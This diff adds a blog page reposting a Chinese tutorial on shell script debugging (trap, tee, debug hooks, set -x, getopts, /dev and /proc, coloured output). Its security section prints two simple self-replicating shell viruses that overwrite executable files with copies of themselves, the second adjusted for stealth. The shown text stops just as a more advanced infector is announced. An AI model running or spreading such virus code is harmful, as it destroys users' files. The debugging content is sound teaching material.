@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+  <head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8">
+	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+	<title>modao</title>
+	
+	<script type="text/javascript" charset="utf-8">
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "https://hm.baidu.com/hm.js?36479f1e15841da95f9e92a25b010d23";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+	
+      
+<link rel="stylesheet" href="/css/navigatebar.css">
+
+
+<div class="navigatebar">
+	<div class="navigatebar-button navigatebar-mine">
+    <a href="/">modao</a>
+	</div>
+	
+	
+        <div class="navigatebar-button">
+          <a href="/">Home</a>
+        </div>
+	
+        <div class="navigatebar-button">
+          <a href="/categories">Categories</a>
+        </div>
+	
+        <div class="navigatebar-button">
+          <a href="/links">Friends</a>
+        </div>
+	
+        <div class="navigatebar-button">
+          <a href="/sites">Sites</a>
+        </div>
+	
+        <div class="navigatebar-button">
+          <a href="/stars">Stars</a>
+        </div>
+	
+</div>
+
+
+<link rel="stylesheet" href="/css/font.css">
+
+
+<link rel="stylesheet" href="/css/post.css" media="screen and (min-width: 600px)">
+
+
+<link rel="stylesheet" href="/css/post_mobile.css" media="screen and (max-width: 600px)">
+
+
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+<div class="toc">
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">一、简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%AF%A6%E8%A7%A3"><span class="toc-text">二、详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81Shell%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF"><span class="toc-text">1、Shell调试技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81Shell%E4%B8%BB%E9%A2%98"><span class="toc-text">2、Shell主题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81Shell%E8%84%9A%E6%9C%AC%E5%AE%89%E5%85%A8"><span class="toc-text">3、Shell脚本安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81Shell%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8"><span class="toc-text">4、Shell简单应用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">三、总结</span></a></li></ol>
+</div>
+
+<div class="content-area">
+	<div class="title">
+		(转载)shell浅谈之十二shell调试及主题
+	</div>
+	
+	<div class="page-date">
+		2020-11-20
+	</div>
+	
+	<div class="category-area">
+		
+			 
+				「
+				<div class="category">
+					<a href="/categories/Shell">Shell</a>
+				
+				</div>
+				」
+			
+		
+	</div>
+	
+	<div class="content">
+		<p>原文：<a target="_blank" rel="noopener" href="https://blog.csdn.net/taiyang1987912/article/details/39897653">shell浅谈之十二shell调试及主题</a></p>
+<p>作者：<a target="_blank" rel="noopener" href="https://me.csdn.net/taiyang1987912">乌托邦2号</a></p>
+<span id="more"></span>
+
+<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>​    Shell中不存在调试器，对脚本中产生的语法错误只会产生模糊的错误提示信息。shell中也经常存在隐涩的逻辑错误，使得脚本无法按照程序员的意愿运行。因此shell脚本的调试有了很大的难度。好的编程风格和习惯也是为了减小调试程序的难度。</p>
+<h1 id="二、详解"><a href="#二、详解" class="headerlink" title="二、详解"></a>二、详解</h1><h2 id="1、Shell调试技术"><a href="#1、Shell调试技术" class="headerlink" title="1、Shell调试技术"></a>1、Shell调试技术</h2><p>   Shell脚本调试就是发现引发脚本错误的原因以及在脚本源代码中定位发生错误的行，常用的手段包括分析输出的错误信息、通过在脚本中加入调试语句、输出调试信息来辅助诊断错误、利用调试工具等。</p>
+<p>（1）shell错误</p>
+<p>​     Shell脚本的错误可以分为两类，第一类是Shell脚本中存在的语法错误，这种比较直观，只要定位发生错误的代码段或行，比如漏写关键字、漏写引号、空格符该有而未有、变量大小写不区分等；第二类是Shell脚本能够执行完毕，但并不是按照我们所期望的方式运行，即存在逻辑错误，这种比较隐晦，并不影响脚本的正常执行。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br>count=<span class="hljs-number">1</span><br>MAX=<span class="hljs-number">5</span><br> <br><span class="hljs-keyword">while</span> [ <span class="hljs-string">&quot;$SECONDS&quot;</span> -le <span class="hljs-string">&quot;$MAX&quot;</span> ];<span class="hljs-keyword">do</span><br>  echo <span class="hljs-string">&quot;This is the $count time to sleep.&quot;</span><br>  count=$count+<span class="hljs-number">1</span><br>  ###正确应是: let count=$count+<span class="hljs-number">1</span>,把count当作整数处理<br>  sleep <span class="hljs-number">2</span><br>done<br> <br>echo <span class="hljs-string">&quot;The running time of this script is $SECONDS&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#!/bin/bash<br> <br>Var1=56<br>Var2=865<br> <br>let Var3=Var1*var2<br>###正确的是:   let Var3=Var1*Var2,未区分大小写字母，变量var2=0<br>echo &quot;$Var1*$Var2=$Var3&quot;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>（2）shell调试技术之一：trap命令</p>
+<p>​    trap命令是linux内建命令，用于捕捉信号。trap命令可以指定收到某种信号时所执行的命名，格式为：trap command sig1 sig2 … sigN。</p>
+<p>​    Shell脚本执行会产生三个所谓的“伪信号”（因为这三个信号是shell产生的，而其他信号是由操作系统产生的），可以利用trap命令捕获这三个“伪信号”。它们分别是EXIT、ERR和DEBUG，其产生条件如下表：</p>
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141010095902484" alt="img"></p>
+<p>   trap命令通过捕捉三种“伪信号”能方便地随时监控变量的变化、正常函数和脚本的结束、跟踪异常的函数和命令。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#利用trap命令捕捉DEBUG信号跟踪变量值<br>#!/bin/bash<br> <br>trap <span class="hljs-string">&#x27;echo &quot;before execute line:$LINENO, a=$a,b=$b,c=$c&quot;&#x27;</span> DEBUG  #LINENO是shell内部变量,打印执行命令的行号<br>a=<span class="hljs-number">0</span><br>b=<span class="hljs-number">2</span><br>c=<span class="hljs-number">100</span><br><span class="hljs-keyword">while</span> :                            #冒号相当于TRUE<br><span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> ((a &gt;= <span class="hljs-number">10</span>))                 <span class="hljs-meta">#i大于等于10时，跳出while循环</span><br>    then<br>        <span class="hljs-keyword">break</span><br>    fi<br>echo <span class="hljs-string">&quot;*************&quot;</span><br>let <span class="hljs-string">&quot;a=a+2&quot;</span><br>let <span class="hljs-string">&quot;b=b*2&quot;</span><br>let <span class="hljs-string">&quot;c=c-10&quot;</span><br>done<br></code></pre></td></tr></table></figure>
+
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141010101045462" alt="img"></p>
+<p>​    上图为部分输出截图，其中由于trap命令的存在，每执行一行命名前都输出a、b、c三个变量的值。执行第5行a=0前捕捉到DEBUG信号，打印未初始化的三个变量的值。trap、do、then、done、fi都无DEBUG信号发出。</p>
+<p>​    利用trap命令捕获DEBUG信号，只需一条trap语句就可以完成对相关变量的全程跟踪，分析运行结果可以看到整个脚本的执行轨迹，判断哪些条件分支执行了哪些条件分支没有执行。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#利用trap命令捕捉EXIT信号跟踪函数结束<br>#!/bin/<span class="hljs-function">bash</span><br><span class="hljs-function"> </span><br><span class="hljs-function"><span class="hljs-title">fun1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  echo <span class="hljs-string">&quot;This is an correct function&quot;</span><br>  var=<span class="hljs-number">2010</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>              <span class="hljs-meta">#return不发送EXIT信号</span><br>&#125;<br>trap <span class="hljs-string">&#x27;echo &quot;Line:$LINENO,var=$var&quot;&#x27;</span> EXIT<br>echo <span class="hljs-string">&quot;*************&quot;</span><br>fun1<br>echo <span class="hljs-string">&quot;------------&quot;</span><br>exit <span class="hljs-number">0</span>              #发送EXIT信号，执行结果： Line:<span class="hljs-number">1</span>,var=<span class="hljs-number">2010</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#trap捕捉ERR信号跟踪函数或命名异常，一条命令返回非零状态码时即执行不成功<br>#!/bin/bash<br> <br>fun2()<br>&#123;<br>  echo &quot;This is an error function&quot;<br>  var=2010<br>  return 1               #非零被认为是异常函数，产生ERR信号<br>&#125;<br>trap &#x27;echo &quot;Line:$LINENO,var=$var&quot;&#x27; ERR<br>fun2<br>ipconfig                 #错误的命令，正确是ifconfig，产生ERR信号<br></code></pre></td></tr></table></figure>
+
+
+
+<p>（3）shell调试技术之二：tee命令</p>
+<p>​    tee命令产生的数据流向字母T，将一个输出分为两个支流，一个到标准输出另一个到某输出文件。tee的特性可以使用到shell的管道及输入/输出重定向的调试上，使用管道时，其中间结果不会显示在屏幕上，若管道连接的一系列命名的执行并非预期结果，则调试出现困难，此时就得借助于tee命名。</p>
+<p>   利用tee命令获得机器的IP地址（非常实用）。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br> <br>localIP=`cat /etc/sysconfig/network-scripts/ifcfg-p4p1 | tee debug.log | grep <span class="hljs-string">&#x27;IPADDR&#x27;</span> | tee -a debug.log | cut -d= -f2 | tee -a debug.log`<br>echo <span class="hljs-string">&quot;The local IP is: $localIP&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141010105337969" alt="img"></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br> <br>localIP=`ifconfig | grep <span class="hljs-string">&#x27;inet addr&#x27;</span> | grep -v <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> | cut -d: -f3 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>echo <span class="hljs-string">&quot;The local IP is: $localIP&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>   在当前目录下会产生debug.log文件，tee -a追加到文件，因此debug.log保存了处理的信息，查看文件了解管道间的数据流向。</p>
+<p>   tee命令适用于管道的调试，观察tee命令产生的中间结果文件，可以清晰地看出管道间的数据流向。</p>
+<p>（4）shell调试技术之三：调试钩子</p>
+<p>​    调试钩子也称为调试块，实际上是if/then结构的代码块，在程序开发调试阶段将DEBUG设置成TRUE，到发布阶段将DEBUG设置成FALSE，关闭调试钩子，无须删除代码。调试钩子的代码：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">DEBUG</span>()<br>&#123;<br>  <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$DEBUG&quot;</span> = <span class="hljs-string">&quot;true&quot;</span> ]<br>  then<br>    echo <span class="hljs-string">&quot;Debugging information:&quot;</span><br>  fi<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>   调试钩子中DEBUG是一个全局变量，开发调试阶段，可利用export DEBUG=true命令将DEBUG设置成true，执行调试信息。 </p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/<span class="hljs-function">bash</span><br><span class="hljs-function"> </span><br><span class="hljs-function"><span class="hljs-title">DEBUG</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$DEBUG&quot;</span> = <span class="hljs-string">&quot;true&quot;</span> ]<br>  then<br>    $@                         #输出所有参数信息与$*等价<br>  fi<br>&#125;<br> <br>a=<span class="hljs-number">0</span><br>b=<span class="hljs-number">2</span><br>c=<span class="hljs-number">100</span><br>DEBUG echo <span class="hljs-string">&quot;a=$a b=$b c=$c&quot;</span>    #第<span class="hljs-number">1</span>个调试钩子<br><span class="hljs-keyword">while</span> :                         <br><span class="hljs-keyword">do</span><br>  DEBUG echo <span class="hljs-string">&quot;a=$a b=$b c=$c&quot;</span>  #第<span class="hljs-number">2</span>个调试钩子<br>  <span class="hljs-keyword">if</span> ((a &gt;= <span class="hljs-number">10</span>))                 #当a大于等于<span class="hljs-number">10</span>时，跳出<span class="hljs-keyword">while</span>循环<br> then<br>        <span class="hljs-keyword">break</span><br>    fi<br> <br>let <span class="hljs-string">&quot;a=a+2&quot;</span>                       <span class="hljs-meta">#a、b、c值不断变化</span><br>let <span class="hljs-string">&quot;b=b*2&quot;</span><br>let <span class="hljs-string">&quot;c=c-10&quot;</span><br>done<br></code></pre></td></tr></table></figure>
+
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141010111756416" alt="img"></p>
+<p>（5）shell调试技术之四：shell选项</p>
+<p>利用set命令开启和关闭shell选项的方法，不用修改源代码即可输出相关的调试信息。用于脚本的调试选项是-n、-x和-c。</p>
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141010111902640" alt="img"></p>
+<p>​    Shell脚本编写完成后，使用-n选项来测试脚本是否存在语法错误是一个很好的习惯。因为实际执行脚本会对系统环境产生影响，则执行时发现语法错误还得做一系列的系统环境的恢复工作，才能继续测试脚本。脚本中开启-n选项，使用set -n或set -o noexec，脚本会检测语法并不执行。也可以利用sh命名直接对脚本进行语法检查：sh -n 脚本名。</p>
+<p>​    -x选项用来跟踪脚本的执行，把实际执行的每一条命令行显示出来，并在行首显示一个“+”符号，“+”符号后面显示的是经过了变量替换之后的命名行内容，有助于分析实际执行的命令。-x选项经常与trap捕捉DEBUG信号结合使用，这样既可以输出实际执行的每一条命令又可以逐行跟踪相关变量的值，对调试有很大的帮助。可在脚本内使用set -x或使用sh -x执行脚本。</p>
+<p>   -x选项以“+”作为提示符表示调试信息，显得美中不足，可以通过shell提供的三个有用的内部变量定制-x选项的提示符。设置PS4使得-x提示符能包含LINENO和FUNCNAME等丰富的信息。</p>
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141010114142445" alt="img"></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/<span class="hljs-function">bash</span><br><span class="hljs-function"> </span><br><span class="hljs-function"><span class="hljs-title">isroot</span><span class="hljs-params">()</span>           #判断执行脚本的用户是否是root</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$UID&quot;</span> -ne <span class="hljs-number">0</span> ]<br>  then<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>  fi<br>&#125;<br> <br><span class="hljs-built_in">echoroot</span>()<br>&#123;<br>    isroot                #调用函数<br>  <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$?&quot;</span> -ne <span class="hljs-number">0</span> ]<br>  then<br>    echo <span class="hljs-string">&quot;I am not ROOT user!&quot;</span><br>  <span class="hljs-keyword">else</span><br>    echo <span class="hljs-string">&quot;ROOT user!&quot;</span><br>  fi<br>&#125;<br> <br><span class="hljs-keyword">export</span> PS4=<span class="hljs-string">&#x27;+&#123;$LINENO:$&#123;FUNCNAME[0]&#125;:$&#123;FUNCNAME[1]&#125;&#125;&#x27;</span>   #对PS4变量重新赋值<br>echoroot<br></code></pre></td></tr></table></figure>
+
+<p>   -c选项作用是使用shell解释器从一个字符串中而不是文件中读取并执行shell命名，仅用于临时测试一小段脚本的执行结果，而在shell命令行直接输入也会达到相同效果， 因此使用频率不高。如sh -c ‘a=2;b=2012;let c=$a*$b;echo “c=$c”‘，命令间用分号分隔。</p>
+<h2 id="2、Shell主题"><a href="#2、Shell主题" class="headerlink" title="2、Shell主题"></a>2、Shell主题</h2><p>（1）Shell说明和用户提示信息</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br> <br>flag=<span class="hljs-number">0</span>;<br> <br>echo <span class="hljs-string">&quot;This script is used to username and password what you input is right or wrong. &quot;</span><br> <br><span class="hljs-keyword">for</span> ((i=<span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">3</span> ; i++))<br><span class="hljs-keyword">do</span><br>    echo -n <span class="hljs-string">&quot;Please input your name: &quot;</span><br>    read username<br> <br>    echo -n <span class="hljs-string">&quot;Please input your password: &quot;</span><br>    read password<br> <br>    <span class="hljs-keyword">if</span> test <span class="hljs-string">&quot;$username&quot;</span> = <span class="hljs-string">&quot;user&quot;</span> -a <span class="hljs-string">&quot;$password&quot;</span> = <span class="hljs-string">&quot;pwd&quot;</span> <br>    then<br>        echo <span class="hljs-string">&quot;login success&quot;</span><br>        flag=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span> <br>        echo <span class="hljs-string">&quot;The username or password is wrong!&quot;</span><br>    fi<br>done<br> <br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$flag&quot;</span> -eq <span class="hljs-string">&quot;0&quot;</span> ]<br>then<br>    echo <span class="hljs-string">&quot;You have tried 3 times. Login fail!&quot;</span><br>fi<br></code></pre></td></tr></table></figure>
+
+<p>（2）Shell特殊命令，shift和getopts</p>
+<p>   shift命令主要用于向脚本传递参数时每次将参数位置向左偏移一位。</p>
+<p>   使用shift显示所有的命令行参数：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br> <br>echo <span class="hljs-string">&quot;number of arguments is $#&quot;</span><br> <br>echo <span class="hljs-string">&quot;What you input is: &quot;</span><br> <br><span class="hljs-keyword">while</span> [[ <span class="hljs-string">&quot;$*&quot;</span> != <span class="hljs-string">&quot;&quot;</span> ]]  #等价于<span class="hljs-keyword">while</span> [ <span class="hljs-string">&quot;$#&quot;</span> -gt <span class="hljs-number">0</span> ]<br><span class="hljs-keyword">do</span><br>    echo <span class="hljs-string">&quot;$1&quot;</span><br>    shift<br>done<br></code></pre></td></tr></table></figure>
+
+<p>Shell中提供了一条获取和处理命令行选项的getopts语句，使得控制多个命令行参数更加容易。格式为getopts option  variable，option中包含一个有效的单字符选项。若getopts命令在命令行中发现了连字符，那么命名将用连字符后面的字符与option相比较，若匹配成功则 把变量variable值设为该选项，若匹配不成功，则variable设为“?”。当getopts发现连字符后面没有字符后会返回一个非零的状态值。</p>
+<p>   有时有必要在脚本中指定命令行选项取值，getopts提供了一种方式，在option中将一个冒号放在选项后，如getopts ab: variable表示-a后可以不加实际值进行传递，而-b后必须取值，如果试图不取值传递此选项，会返回一个错误信息。有时错误信息提示并不明确，需要自己定义提示信息屏蔽它，那么将冒号放在option的开始部分，如getopts :ab: variable。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br> <br><span class="hljs-keyword">while</span> getopts <span class="hljs-string">&quot;:fh:&quot;</span> optname <br> <span class="hljs-keyword">do</span>       <br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;$optname&quot;</span> in<br>      f)<br>             echo <span class="hljs-string">&quot;Option $optname is specified&quot;</span><br>            ;;<br>       h)<br>             echo <span class="hljs-string">&quot;Option $optname has value $OPTARG&quot;</span><br>             ;;<br>      \?)<br>             echo <span class="hljs-string">&quot;Unknown option $OPTARG&quot;</span><br>             ;;<br>       :)<br>             echo <span class="hljs-string">&quot;No parameter value for option $OPTARG&quot;</span><br>             ;;<br>       *)<br>           echo <span class="hljs-string">&quot;Unknown error while processing options&quot;</span><br>             ;;<br>        esac<br> done<br> <br>shift $(($OPTIND - <span class="hljs-number">1</span>))<br> <br><span class="hljs-keyword">for</span> options in <span class="hljs-string">&quot;$@&quot;</span><br><span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> [ ! -f $<span class="hljs-number">2</span> ]<br>    then<br>        echo <span class="hljs-string">&quot;Can not find file $options . &quot;</span><br>    <span class="hljs-keyword">else</span><br>        echo <span class="hljs-string">&quot;Find the file $options . &quot;</span><br>    fi<br>done<br></code></pre></td></tr></table></figure>
+
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141010145841603" alt="img"><br> -f用于判断输入的第二哥命令行参数是否为文件，而-h 后必须取值。 </p>
+<p>（3）Shell中/dev文件系统</p>
+<p>​    Shell中存在伪文件系统/dev，该文件系统包含每个物理设备对应的文件。若需挂载物理设备或虚拟物理设备则可通过操作/dev完成。/dev/null和/dev/zero是两个特殊的伪设备，它们是虚拟的仅仅存在于软件的虚拟设备中。</p>
+<p>​    /dev/zero是一个非常有用的伪设备，它用于创建空文件也可以创建RAM文件，可通过/dev/zero来建立一个交换文件。</p>
+<p>​    /dev/null相当于一个文件的“黑洞” ，它非常接近于一个只写文件，所以写入它的内容都会永远丢失。若不想使用stdout，可以通过使用/dev/null将stdout禁止。如find / -name string &gt; /dev/null，把查找的错误提示转移到特定的目录中。shell中会有如下命令： &gt;/dev/null 2&gt;&amp;1，其中”&gt;/dev/null“等价于”1&gt;/dev/null“表示标准输出重定向到空设备文件，“2&gt;&amp;1”表示标准错误输出重定向等同于标准输出，也重定向到空设备文件。例如find / -name string &gt; result.log 2&gt;&amp;1（等价于find / -name string 2&gt; result.log 1&gt;&amp;2）。</p>
+<p>（4）Shell中/proc文件系统</p>
+<p>​    /proc文件系统是一个伪文件系统，它只存在内存中而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和应用程序可以通过/proc得到系统的信息并可以改变内核的某些参数。由于系统的信息（如进程）是动态改变的，所以/proc文件系统是动态地从系统内核读出所需信息并提交的。/proc内的文件常被称为虚拟文件，有些文件使用查看命令查看会返回大量信息但文件本身的大小却会显示0字节。</p>
+<p>   在/proc下有三个很重要的目录：net、scsi和sys。sys目录可写，可通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。</p>
+<p>   cat  /proc/interrupts查看中断，/proc/sys目录修改内核参数来优化系统，/proc中有编号（为进程ID）的子目录可以查看运行中的进程信息，cat /proc/filesystems | awk -F’\t’ ‘{print $2}’查看文件系统支持的类型，cat  /proc/net/sockstat查看网络信息，cat /proc/net/tcp查看TCP的具体使用情况。</p>
+<p>（5）带颜色的shell脚本</p>
+<p>​    Shell脚本中，脚本执行终端的颜色可以使用“ANSI非常规字符序列”来生成，如echo -e “\033[44;37;5m Hello  World\033[0m”，将前景色设置成蓝色，背景色设置成白色。-e用于激活特殊字符的解析器，\033引导非常规字符序列，m意味着设置属性并结束非常规字符序列，”44;37;5”可以生成不同颜色的组合，数值和编码的前后顺序无关。</p>
+<p>​    选择的编码表：</p>
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141010171218781" alt="img"></p>
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141010171308046" alt="img"></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#输出彩色的字符串的形式<br>#!/bin/<span class="hljs-function">bash</span><br><span class="hljs-function"> </span><br><span class="hljs-function"><span class="hljs-title">cfont</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> ((<span class="hljs-string">&quot;$#&quot;</span>!= <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">do</span><br>                <span class="hljs-keyword">case</span> $<span class="hljs-number">1</span> in<br>        -b)<br>            echo -ne <span class="hljs-string">&quot; &quot;</span><br>            ;;<br>        -t)<br>            echo -ne <span class="hljs-string">&quot;\t&quot;</span><br>            ;;<br>        -n)     <br>            echo -ne <span class="hljs-string">&quot;\n&quot;</span><br>            ;;<br>        -black)<br>            echo -ne <span class="hljs-string">&quot;\033[30m&quot;</span>    #黑色前景<br>            ;;<br>                -red)<br>            echo -ne <span class="hljs-string">&quot;\033[31m&quot;</span>    #红色前景<br>            ;;<br>                -green)<br>             echo -ne <span class="hljs-string">&quot;\033[32m&quot;</span>   #绿色前景<br>             ;;<br>                -yellow)<br>             echo -ne <span class="hljs-string">&quot;\033[33m&quot;</span>   #黄色前景<br>             ;;<br>                -blue)<br>             echo -ne <span class="hljs-string">&quot;\033[34m&quot;</span>   #蓝色前景<br>             ;;<br>                -purple)<br>             echo -ne <span class="hljs-string">&quot;\033[35m&quot;</span>   #紫色前景<br>             ;;<br>                -cyan)<br>             echo -ne <span class="hljs-string">&quot;\033[36m&quot;</span>   #青色前景<br>             ;;<br> 				-white|-gray)<br>             echo -ne <span class="hljs-string">&quot;\033[37m&quot;</span>   #白色/灰色前景<br>             ;;<br>        -reset)<br>         		 echo -ne <span class="hljs-string">&quot;\033[0m&quot;</span>    #重新设置属性到默认设置<br>             ;;<br>        -h|-help|--help)<br>             echo <span class="hljs-string">&quot;Usage: cfont -color1 message1 -color2 message2 ...&quot;</span><br>             echo <span class="hljs-string">&quot;eg: cfont -red [ -blue message1 message2 -red ]&quot;</span><br>             ;;<br>         *)<br>             echo -ne <span class="hljs-string">&quot;$1&quot;</span><br>             ;;<br>        esac<br>        <br>        shift<br>    done<br>&#125;<br> <br>cfont -green <span class="hljs-string">&quot;Start service ...&quot;</span> -red  <span class="hljs-string">&quot; [&quot;</span> -blue <span class="hljs-string">&quot; OK&quot;</span> -red <span class="hljs-string">&quot; ]&quot;</span> -black -n<br></code></pre></td></tr></table></figure>
+
+<p><img src="/shell%E6%B5%85%E8%B0%88%E4%B9%8B%E5%8D%81%E4%BA%8Cshell%E8%B0%83%E8%AF%95%E5%8F%8A%E4%B8%BB%E9%A2%98/20141010172548364" alt="img"></p>
+<h2 id="3、Shell脚本安全"><a href="#3、Shell脚本安全" class="headerlink" title="3、Shell脚本安全"></a>3、Shell脚本安全</h2><p>（1）shc工具加密shell脚本</p>
+<p>   若Shell脚本中包含敏感的口令或其他重要信息，而且不希望用户通过ps -ef捕获敏感信息，可用shc工具给脚本增加一层额外的安全保护。shc使用RC4加密算法把shell脚本转换成二进制可执行文件（支持静态和动态链接）。</p>
+<p>   shc安装后使用命名进行加密：shc -v -f filename.sh，-v是输出详细编译日志，-f指定脚本的名称。加密成功后会生成以.x和.c结尾的两个新文件，如生成可执行文件filename.sh.x和C语言源文件filename.sh.x.c。</p>
+<p>（2）shell脚本简单病毒</p>
+<p>最原始的shell病毒:</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br> <br><span class="hljs-keyword">for</span> file in *<br><span class="hljs-keyword">do</span><br>    cp $<span class="hljs-number">0</span> $file<br>done<br></code></pre></td></tr></table></figure>
+
+<p>​    遍历当前文件系统的所有文件，然后覆盖所有文件，但linux是多用户操作系统，它的文件具有保护模式，所以上述脚本会报出一大堆错误，所以会很快被管理员发现并制止它的传染，为增强其隐蔽性对脚本进行改进： </p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">#!/bin/bash<br> <br><span class="hljs-keyword">for</span> file in *<br><span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> test -f $file          #测试是否是文件<br>    then<br>        <span class="hljs-keyword">if</span> test -x $file      #测试文件是否可执行<br>        then<br>            <span class="hljs-keyword">if</span> test -w $file  #测试文件是否可读<br>            then<br>                grep -s <span class="hljs-string">&quot;myself_flag&quot;</span> $file &gt; .temp <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>   #判断自己的一个标志，是否为该shell脚本<br>                #可以写成 <span class="hljs-keyword">if</span> file $file | grep -s <span class="hljs-string">&#x27;shell script&#x27;</span> &gt; /dev/null<br>                <span class="hljs-keyword">if</span> [ $? -ne <span class="hljs-number">0</span> ] <br>                then<br>                    cp -f $<span class="hljs-number">0</span> $file<br>                fi<br>             fi<br>         fi<br>     fi<br>done<br>rm .temp -f<br></code></pre></td></tr></table></figure>
+
+<p>但是脚本病毒一旦在感染完毕后就什么也不做了，它没有像二进制病毒那样的潜伏的危害性，只是简单的覆盖宿主而已。 </p>
+<p>下面利用传统的二进制病毒的感染机制并优化的代码：</p>
